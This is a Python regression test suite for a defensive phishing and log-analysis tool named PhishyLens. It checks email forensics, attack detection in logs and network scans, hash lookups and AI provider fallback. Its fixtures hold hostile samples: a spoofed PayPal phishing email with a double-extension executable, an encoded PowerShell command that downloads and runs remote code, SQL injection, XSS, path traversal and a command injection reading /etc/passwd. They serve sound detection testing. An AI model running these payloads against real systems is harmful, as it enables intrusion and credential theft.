"""
PhishyLens regression tests: run with:  python -m unittest discover -s tests -v   (or: pytest)
All network access is mocked, so the suite is deterministic and works offline.
"""
import base64, io, os, sys, tempfile, unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.environ.setdefault("DB_PATH", os.path.join(tempfile.gettempdir(), "phishylens_test.db"))
os.environ["PHISHYLENS_SKIP_DOTENV"] = "1"          # never pick up a developer's real keys / REQUIRE_API_KEY from .env

import requests
import app as app_module
from analyzers.email_analyzer import analyze_email, parse_email_forensics
from analyzers.log_analyzer import analyze_logs, decode_ps_encoded
from analyzers.network_analyzer import analyze_network
from analyzers.hash_analyzer import analyze_hash
from utils.scoring import explain_score, calculate_score
from utils.threat_intel import is_public_ip

PHISH_EML = (
    "From: \"PayPal\" <support@paypa1-secure.xyz>\nReturn-Path: <bounce@mailer.badhost.ru>\nReply-To: help@gmail-support.top\n"
    "X-Originating-IP: [185.220.101.4]\nAuthentication-Results: mx.x.com; spf=fail smtp.mailfrom=badhost.ru; dkim=none; dmarc=fail\n"
    "Subject: URGENT verify your account\nContent-Type: multipart/mixed; boundary=B\n\n--B\nContent-Type: text/html\n\n"
    "<a href='http://evil.xyz/login'>https://paypal.com/secure</a> act immediately or your account will be suspended\n--B\n"
    "Content-Type: application/octet-stream\nContent-Disposition: attachment; filename=\"invoice.pdf.exe\"\n"
    "Content-Transfer-Encoding: base64\n\nTVqQAAMAAAAEAAAA\n--B--\n")


class OfflineCase(unittest.TestCase):
    def setUp(self):
        p1 = mock.patch("requests.get", side_effect=requests.ConnectionError("offline"))
        p2 = mock.patch("requests.post", side_effect=requests.ConnectionError("offline"))
        p3 = mock.patch("requests.head", side_effect=requests.ConnectionError("offline"))
        for p in (p1, p2, p3):
            p.start(); self.addCleanup(p.stop)
        self.client = app_module.app.test_client()


class TestEmail(OfflineCase):
    def test_header_forensics(self):
        f = parse_email_forensics(PHISH_EML)
        self.assertEqual(f["auth"]["spf"], "fail")
        self.assertEqual(f["auth"]["dmarc"], "fail")
        self.assertIn("185.220.101.4", f["origin_ips"])
        self.assertTrue(f["attachments"][0]["double_extension"])
        self.assertEqual(len(f["attachments"][0]["sha256"]), 64)
        self.assertTrue(f["html_link_mismatches"])

    def test_phishing_email_is_malicious_and_explained(self):
        r = analyze_email(PHISH_EML)
        names = {x["name"] for x in r["findings"]}
        for n in ("SPF Authentication Failed", "DMARC Authentication Failed", "Reply-To Hijack", "Double-Extension Attachment"):
            self.assertIn(n, names)
        self.assertEqual(r["verdict"], "MALICIOUS")
        self.assertEqual(sum(c["points"] for c in r["score_explanation"]["contributions"]), r["score"])

    def test_body_mentioning_spf_is_not_auth_pass(self):
        r = parse_email_forensics("From: a@b.com\nSubject: hi\n\nWe use SPF and DKIM for security.")
        self.assertEqual(r["auth"]["spf"], "")

    def test_garbage_input_does_not_crash(self):
        self.assertIn("verdict", analyze_email("\x00\x01 not an email"))


class TestLogs(OfflineCase):
    ENC = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x.top/a')".encode("utf-16le")).decode()

    def test_web_attacks(self):
        logs = ('1.2.3.4 - - [10/Oct/2026:13:55:36 +0000] "GET /i?id=1%27%20UNION%20SELECT%20a,b%20FROM%20users-- HTTP/1.1" 200 5 "-" "sqlmap/1.7"\n'
                '1.2.3.4 - - [10/Oct/2026:13:55:37 +0000] "GET /s?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 5 "-" "Mozilla"\n')
        names = {f["name"] for f in analyze_logs(logs)["findings"]}
        self.assertIn("SQL Injection", names); self.assertIn("Cross-Site Scripting (XSS)", names)

    def test_powershell_encoded_and_bypass(self):
        r = analyze_logs(f"powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -enc {self.ENC}")
        names = {f["name"] for f in r["findings"]}
        self.assertIn("PowerShell Encoded Command", names); self.assertIn("PowerShell Execution Policy Bypass", names)
        self.assertTrue(any("inside encoded payload" in n for n in names))
        self.assertIn("DownloadString", decode_ps_encoded(f"-enc {self.ENC}"))

    def test_ssh_bruteforce_and_json(self):
        lines = "".join(f"Oct  2 10:00:0{i} srv sshd[1]: Failed password for root from 45.9.9.9 port 22 ssh2\n" for i in range(6))
        self.assertIn("SSH / Login Brute Force", {f["name"] for f in analyze_logs(lines)["findings"]})
        j = analyze_logs('{"src_ip":"1.1.1.1","uri":"/a?x=../../etc/passwd","status":200}')
        self.assertIn("Path Traversal / LFI", {f["name"] for f in j["findings"]})

    def test_clean_log_is_benign(self):
        r = analyze_logs('1.2.3.4 - - [10/Oct/2026:13:55:36 +0000] "GET /index.html HTTP/1.1" 200 5 "-" "Mozilla/5.0"')
        self.assertEqual(r["verdict"], "BENIGN")


class TestNetwork(OfflineCase):
    def test_nmap_triage(self):
        txt = "Nmap scan report for 10.10.10.5\nPORT STATE SERVICE VERSION\n21/tcp open ftp vsftpd 2.3.4\n445/tcp open microsoft-ds Samba smbd 3.0.20\n"
        names = {f["name"] for f in analyze_network(txt)["findings"]}
        self.assertIn("Vulnerable Service: vsftpd 2.3.4 Backdoor", names)
        self.assertIn("Vulnerable Service: Old Samba (usermap_script)", names)

    def test_grepable_output(self):
        txt = "Host: 10.0.0.2 ()\tPorts: 23/open/tcp//telnet//Linux telnetd/, 3389/open/tcp//ms-wbt-server///\n"
        names = {f["name"] for f in analyze_network(txt)["findings"]}
        self.assertTrue(any("23/Telnet" in n for n in names)); self.assertTrue(any("3389/RDP" in n for n in names))

    def test_syn_scan_in_pcap_export(self):
        rows = "".join(f"{i},0.{i},10.0.0.9,10.0.0.1,TCP,60,40000 → {1000+i} [SYN] Seq=0\n" for i in range(30))
        r = analyze_network("No.,Time,Source,Destination,Protocol,Length,Info\n" + rows)
        self.assertIn("TCP Port Scan Detected", {f["name"] for f in r["findings"]})


class TestScoringAndHash(OfflineCase):
    def test_contributions_sum_to_score(self):
        for n in (1, 3, 8):
            fs = [{"severity": s, "name": f"F{i}"} for i, s in enumerate(["CRITICAL", "HIGH", "MEDIUM", "LOW"] * 2)][:n]
            e = explain_score(fs)
            self.assertEqual(sum(c["points"] for c in e["contributions"]), e["score"])
            self.assertEqual(e["score"], calculate_score(fs))

    def test_empty_file_hash_not_malicious(self):
        self.assertEqual(analyze_hash("d41d8cd98f00b204e9800998ecf8427e")["verdict"], "BENIGN")

    def test_eicar_is_malicious(self):
        self.assertEqual(analyze_hash("44d88612fea8a8f36de82e1278abb02f")["verdict"], "MALICIOUS")

    def test_ip_scope(self):
        self.assertFalse(is_public_ip("10.0.0.1")); self.assertFalse(is_public_ip("::1")); self.assertTrue(is_public_ip("8.8.8.8"))


class TestApi(OfflineCase):
    def test_health_and_request_id(self):
        r = self.client.get("/api/health"); self.assertEqual(r.status_code, 200); self.assertTrue(r.headers.get("X-Request-ID"))

    def test_validation_errors_are_json(self):
        for path in ("/api/analyze/url", "/api/analyze/email", "/api/analyze/logs", "/api/analyze/network", "/api/analyze/hash"):
            r = self.client.post(path, json={}); self.assertEqual(r.status_code, 400, path); self.assertIn("request_id", r.get_json())
        self.assertEqual(self.client.post("/api/analyze/ip", json={"ip": "nope"}).status_code, 400)

    def test_bad_limit_does_not_500(self):
        self.assertEqual(self.client.get("/api/cases/recent?limit=abc").status_code, 200)

    def test_unknown_api_route_is_json_404(self):
        r = self.client.get("/api/nope"); self.assertEqual(r.status_code, 404); self.assertIn("error", r.get_json())

    def test_eml_upload(self):
        r = self.client.post("/api/analyze/email/upload", data={"file": (io.BytesIO(PHISH_EML.encode()), "m.eml")}, content_type="multipart/form-data")
        self.assertEqual(r.status_code, 200); self.assertEqual(r.get_json()["result"]["verdict"], "MALICIOUS")

    def test_logs_endpoint_and_case_saved_with_action(self):
        r = self.client.post("/api/analyze/logs", json={"logs": '1.2.3.4 - - [10/Oct/2026:13:55:36 +0000] "GET /?id=1 UNION SELECT 1,2 HTTP/1.1" 200 5 "-" "sqlmap"'})
        j = r.get_json()["result"]; self.assertEqual(r.status_code, 200); self.assertIn("score_explanation", j)

    def test_system_endpoints_and_docs(self):
        self.assertEqual(self.client.get("/api/system/status").status_code, 200)
        self.assertIn("errors", self.client.get("/api/system/errors").get_json())
        self.assertIn("/api/analyze/logs", self.client.get("/api/openapi.json").get_json()["paths"])
        self.assertTrue(self.client.get("/api/postman.json").get_json()["item"])

    def test_api_key_enforcement(self):
        with mock.patch.dict(os.environ, {"REQUIRE_API_KEY": "1", "PHISHYLENS_API_KEY": "s3cret"}):
            self.assertEqual(self.client.get("/api/system/status").status_code, 401)
            self.assertEqual(self.client.get("/api/system/status", headers={"X-API-Key": "s3cret"}).status_code, 200)
            self.assertEqual(self.client.get("/api/health").status_code, 200)

    def test_saved_case_round_trip(self):
        r = self.client.post("/api/analyze/hash", json={"hash": "44d88612fea8a8f36de82e1278abb02f"}).get_json()["result"]
        self.assertTrue(r["case_number"].startswith("CASE-"))
        self.assertIn("risk_breakdown", r)
        c = self.client.get(f"/api/case/{r['case_number']}").get_json()
        self.assertIsInstance(c["findings"], list)
        self.assertEqual(c["verdict"], "MALICIOUS")
        self.assertNotEqual(c["action"], "SAFE")
        self.assertEqual(self.client.get("/api/case/NOPE").status_code, 404)


# ─── regression tests for accuracy fixes ─────────────────────────
def _fake_response(status, payload):
    r = mock.Mock(ok=200 <= status < 300, status_code=status)
    r.json.return_value = payload
    return r


class TestUrlHeuristics(OfflineCase):
    def setUp(self):
        super().setUp()
        from utils import threat_intel
        threat_intel._CACHE.clear()
        p = mock.patch("socket.getaddrinfo", side_effect=OSError("no dns"))
        p2 = mock.patch("socket.gethostbyname", side_effect=OSError("no dns"))
        for x in (p, p2):
            x.start(); self.addCleanup(x.stop)

    def test_brand_lookalike_suffix_is_impersonation(self):
        from utils.threat_intel import detect_brand_impersonation
        self.assertEqual(detect_brand_impersonation("https://evilpaypal.com/login"), "PayPal")
        self.assertEqual(detect_brand_impersonation("http://paypal.com.secure-login.tk/"), "PayPal")

    def test_official_brand_domains_are_not_impersonation(self):
        from utils.threat_intel import detect_brand_impersonation, has_suspicious_keywords
        for u in ("https://www.paypal.com/signin", "https://accounts.google.com/", "https://amazon.co.uk/x",
                  "https://login.microsoftonline.com/", "https://shop.example.com/purchase", "https://pineapple.com/"):
            self.assertIsNone(detect_brand_impersonation(u), u)
        self.assertEqual(has_suspicious_keywords("https://www.paypal.com/signin"), [])
        self.assertIn("login", has_suspicious_keywords("https://paypal-help.xyz/login"))

    def test_ip_only_counts_in_host(self):
        from utils.threat_intel import has_ip_in_url, is_free_tld
        self.assertFalse(has_ip_in_url("https://example.com/v1.2.3.4/download"))
        self.assertTrue(has_ip_in_url("http://185.220.101.4/login"))
        self.assertTrue(has_ip_in_url("http://user@[2001:db8::1]:8080/"))
        self.assertTrue(is_free_tld("http://user@evil.tk:8080/a"))
        self.assertFalse(is_free_tld("https://www.gameshop.com/"))

    def test_schemeless_benign_url_has_no_tls_or_keyword_noise(self):
        from analyzers.url_analyzer import analyze_url
        r = analyze_url("google.com")
        names = {f["name"] for f in r["findings"]}
        self.assertNotIn("Unencrypted Channel", names)
        self.assertNotIn("Deceptive Keywords Detected", names)
        self.assertEqual(r["verdict"], "BENIGN")
        self.assertNotIn("Freenom", str(r["domain_info"]))           # no fabricated registrar data
        self.assertIn("Unencrypted Channel", {f["name"] for f in analyze_url("http://example.com/")["findings"]})


class TestIntelAccuracy(OfflineCase):
    def setUp(self):
        super().setUp()
        from utils import threat_intel
        threat_intel._CACHE.clear()

    def test_failed_lookups_are_not_clean_hash(self):
        with mock.patch.dict(os.environ, {"VIRUSTOTAL_API_KEY": "k", "ABUSECH_API_KEY": "bad"}), \
             mock.patch("requests.get", return_value=_fake_response(401, {})), \
             mock.patch("requests.post", return_value=_fake_response(401, {"error": "Unauthorized"})):
            r = analyze_hash("a" * 64)
        self.assertEqual(r["verdict"], "SUSPICIOUS")
        self.assertIn("Hash Provenance Unknown", {f["name"] for f in r["findings"]})
        self.assertTrue(all(s.get("error") for s in r["intel_sources"].values()))

    def test_single_vt_engine_is_not_confirmed_malware(self):
        vt = _fake_response(200, {"data": {"attributes": {"last_analysis_stats": {"malicious": 1, "undetected": 70}}}})
        with mock.patch.dict(os.environ, {"VIRUSTOTAL_API_KEY": "k"}), mock.patch("requests.get", return_value=vt):
            r = analyze_hash("b" * 64)
        self.assertEqual(r["verdict"], "SUSPICIOUS")
        self.assertEqual(sum(c["points"] for c in r["score_explanation"]["contributions"]) if "score_explanation" in r else r["score"], r["score"])

    def test_whitelisted_abuseipdb_ip_not_flagged(self):
        from utils.threat_intel import lookup_ip
        ab = _fake_response(200, {"data": {"abuseConfidenceScore": 0, "totalReports": 900, "isWhitelisted": True}})
        with mock.patch.dict(os.environ, {"ABUSEIPDB_API_KEY": "k"}), mock.patch("requests.get", return_value=ab):
            r = lookup_ip("8.8.8.8")
        self.assertNotIn("AbuseIPDB: Abuse History Confirmed", {f["name"] for f in r["findings"]})
        self.assertIn("recommended_action", r)

    def test_slow_source_does_not_fail_analysis(self):
        from utils import threat_intel
        import time as _t
        with mock.patch.object(threat_intel, "_LOOKUP_BUDGET", 0.2), \
             mock.patch.object(threat_intel, "_ipapi_lookup", side_effect=lambda ip: _t.sleep(1) or {}):
            r = threat_intel._run_parallel({"ipapi": lambda: threat_intel._ipapi_lookup("1.1.1.1")}, 0.2)
        self.assertEqual(r["ipapi"]["error"], "Timed out")

    def test_fixed_scores_explanation_still_sums(self):
        for score in (5, 12, 45, 94):
            e = explain_score([{"severity": "LOW", "name": "a"}, {"severity": "MEDIUM", "name": "b"}], score)
            self.assertEqual(sum(c["points"] for c in e["contributions"]), score)


class TestDetectorFalsePositives(OfflineCase):
    def test_benign_log_lines(self):
        for line in ("Oct  2 10:00:00 srv rsyslogd: -- MARK --",
                     '1.2.3.4 - - [10/Oct/2026:13:55:36 +0000] "GET /list?page=2&id=5 HTTP/1.1" 200 5 "-" "Mozilla/5.0 (X11; Linux x86_64)"',
                     "Oct  2 10:00:00 srv useradd[22]: new user: name=bob, UID=1001, home=/home/bob, shell=/bin/bash"):
            self.assertEqual(analyze_logs(line)["verdict"], "BENIGN", line)

    def test_ssh_attempt_not_double_counted(self):
        three = "".join(f"Oct  2 10:00:0{i} srv sshd[1]: Invalid user admin from 45.9.9.9 port 22\n"
                        f"Oct  2 10:00:0{i} srv sshd[1]: Failed password for invalid user admin from 45.9.9.9 port 22 ssh2\n" for i in range(3))
        self.assertNotIn("SSH / Login Brute Force", {f["name"] for f in analyze_logs(three)["findings"]})

    def test_command_injection_still_detected(self):
        r = analyze_logs('1.2.3.4 - - [10/Oct/2026:13:55:36 +0000] "GET /ping?h=8.8.8.8%3Bcat%20/etc/passwd HTTP/1.1" 200 5 "-" "curl"')
        self.assertIn("Command Injection", {f["name"] for f in r["findings"]})

    def test_udp_snmp_flagged(self):
        r = analyze_network("Nmap scan report for 10.0.0.7\nPORT STATE SERVICE\n161/udp open snmp\n514/udp open syslog\n")
        names = {f["name"] for f in r["findings"]}
        self.assertTrue(any("161/SNMP" in n for n in names))
        self.assertFalse(any("514/" in n for n in names))

    def test_email_auth_from_headers_not_keywords(self):
        names = {f["name"] for f in analyze_email(PHISH_EML)["findings"]}
        self.assertNotIn("Missing Sender Authentication", names)         # Authentication-Results present (lower-case spf=)
        self.assertIn("Display Name Brand Spoofing", names)
        plain = analyze_email("From: Bob <bob@example.com>\nSubject: lunch\n\nWe use SPF and DKIM. Lunch at noon?")
        self.assertIn("Missing Sender Authentication", {f["name"] for f in plain["findings"]})
        self.assertEqual(plain["verdict"], "BENIGN")

    def test_email_free_tld_needs_real_tld(self):
        r = analyze_email("From: a@shop.com\nSubject: hi\n\nSee https://www.gameshop.com/deals today")
        self.assertNotIn("Suspicious URL in Body", {f["name"] for f in r["findings"]})


class TestAIProviders(OfflineCase):
    FINDINGS = [{"severity": "CRITICAL", "name": "Brand Impersonation", "evidence": "PayPal"}]
    NO_KEYS = {"DEEPSEEK_API_KEY": "", "GEMINI_API_KEY": "", "OPENROUTER_API_KEY": "", "AI_PROVIDER": "auto"}

    def _ai(self, **env):
        with mock.patch.dict(os.environ, {**self.NO_KEYS, **env}):
            return self.client.post("/api/ai/analyze", json={"mode": "url", "input": "http://x.tk", "findings": self.FINDINGS,
                                                             "verdict": "SUSPICIOUS", "score": 45}).get_json()

    def test_no_keys_falls_back_to_local(self):
        d = self._ai()
        self.assertEqual(d["source"], "local"); self.assertIn("Brand impersonation", d["analysis"])

    def test_deepseek_used_first(self):
        ok = _fake_response(200, {"choices": [{"message": {"content": "DeepSeek narrative"}}]})
        with mock.patch("requests.post", return_value=ok) as post:
            d = self._ai(DEEPSEEK_API_KEY="ds", GEMINI_API_KEY="gm")
        self.assertEqual((d["source"], d["provider"], d["analysis"]), ("llm", "deepseek", "DeepSeek narrative"))
        self.assertIn("api.deepseek.com", post.call_args[0][0])
        self.assertEqual(post.call_args[1]["headers"]["Authorization"], "Bearer ds")

    def test_failover_to_gemini(self):
        gem = _fake_response(200, {"candidates": [{"content": {"parts": [{"text": "Gemini narrative"}]}}]})
        def fake_post(url, **kw):
            return _fake_response(401, {}) if "deepseek" in url else gem
        with mock.patch("requests.post", side_effect=fake_post):
            d = self._ai(DEEPSEEK_API_KEY="bad", GEMINI_API_KEY="gm")
        self.assertEqual((d["provider"], d["analysis"]), ("gemini", "Gemini narrative"))
        self.assertTrue(d["errors"] and "DeepSeek" in d["errors"][0])

    def test_ai_provider_preference(self):
        from utils.ai_analysis import configured_providers
        with mock.patch.dict(os.environ, {**self.NO_KEYS, "DEEPSEEK_API_KEY": "a", "GEMINI_API_KEY": "b", "AI_PROVIDER": "gemini"}):
            self.assertEqual(configured_providers(), ["gemini", "deepseek"])

    def test_gemini_safety_block_is_failure_not_empty_answer(self):
        blocked = _fake_response(200, {"promptFeedback": {"blockReason": "SAFETY"}})
        with mock.patch("requests.post", return_value=blocked):
            d = self._ai(GEMINI_API_KEY="gm")
        self.assertEqual(d["source"], "local")

    def test_huge_input_is_truncated_in_prompt(self):
        from utils.ai_analysis import build_prompt, MAX_INPUT_CHARS
        p = build_prompt("logs", "A" * 100_000, self.FINDINGS, "MALICIOUS", 90)
        self.assertLess(len(p), MAX_INPUT_CHARS + 3000)

    def test_dotenv_loader_does_not_override(self):
        from utils.env import load_dotenv
        path = os.path.join(tempfile.gettempdir(), "phishylens_test.env")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write('# c\nPL_T1="quoted"\nPL_T2=plain # note\nPL_T3=keep\nEMPTY=\n')
        with mock.patch.dict(os.environ, {"PL_T3": "env-wins", "PHISHYLENS_SKIP_DOTENV": "0"}):
            load_dotenv(path)
            self.assertEqual((os.environ["PL_T1"], os.environ["PL_T2"], os.environ["PL_T3"]), ("quoted", "plain", "env-wins"))
            self.assertNotIn("EMPTY", os.environ)
        for k in ("PL_T1", "PL_T2"):
            os.environ.pop(k, None)


class TestTools(OfflineCase):
    def test_decode_is_not_noisy(self):
        res = self.client.post("/api/tools/decode", json={"text": "hello"}).get_json()["results"]
        self.assertNotIn("BASE64", [x["method"] for x in res])
        res = self.client.post("/api/tools/decode", json={"text": "SGVsbG8gV29ybGQ="}).get_json()["results"]
        self.assertIn({"method": "BASE64", "result": "Hello World"}, res)

    def test_extract_validates_and_dedupes(self):
        t = "8.8.8.8 and 8.8.8.8 and 999.1.1.1, see invoice.pdf at http://evil.example.com/x). mail bob@corp.com"
        i = self.client.post("/api/tools/extract", json={"text": t}).get_json()["iocs"]
        self.assertEqual(i["ips"], ["8.8.8.8"])
        self.assertEqual(i["urls"], ["http://evil.example.com/x"])
        self.assertNotIn("invoice.pdf", i["domains"])
        self.assertNotIn("corp.com", i["domains"])

    def test_hashcrack_offline_dictionary(self):
        d = self.client.post("/api/tools/hashcrack", json={"hash": "5f4dcc3b5aa765d61d8327deb882cf99"}).get_json()
        self.assertEqual((d["found"], d["plaintext"], d["hash_type"]), (True, "password", "MD5"))
        self.assertEqual(self.client.post("/api/tools/hashcrack", json={"hash": "xyz"}).status_code, 400)


if __name__ == "__main__":
    unittest.main()
